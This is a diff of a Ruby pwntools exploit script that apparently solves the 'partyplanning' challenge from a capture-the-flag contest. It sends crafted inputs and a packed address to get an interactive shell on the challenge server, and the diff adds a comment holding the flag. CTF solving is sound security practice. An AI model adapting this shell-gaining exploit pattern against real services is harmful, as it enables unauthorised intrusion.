@@ -3,6 +3,7 @@
 require 'pry'
 require 'pwn'        # https://github.com/peter50216/ruby-pwntools
 
+
 host, port = 'partyplanning.chal.pwning.xxx', 3291
 @local = false
 if ARGV.empty?
@@ -12,12 +13,15 @@ else
 end
 $z = Sock.new host, port
 def z;$z;end
+@p = ''
+def h;@h ||= heapinfo(@p); @h.reload!;end
+def elf; @elf ||= ELF.new(@p); end
 #================= Exploit Start ====================
 
 z.puts '401457'
 z.puts '401335'
-z.puts 'meow'
-z.puts 'jiao'
+z.puts 'Alice'
+z.puts 'david942j'
 z.puts 'lNHRHu' # hash 0x604218
 z.puts 'QQpie'
 z.puts 'WWWW'
@@ -30,3 +34,5 @@ sleep(2)
 z.puts p32(0x402642)[0,3]
 p 'shell!'
 z.interact
+
+# PCTF{4nd_th4ts_why_w3_d0nt_p14n_p4rt13s_1n_p4r4113l}
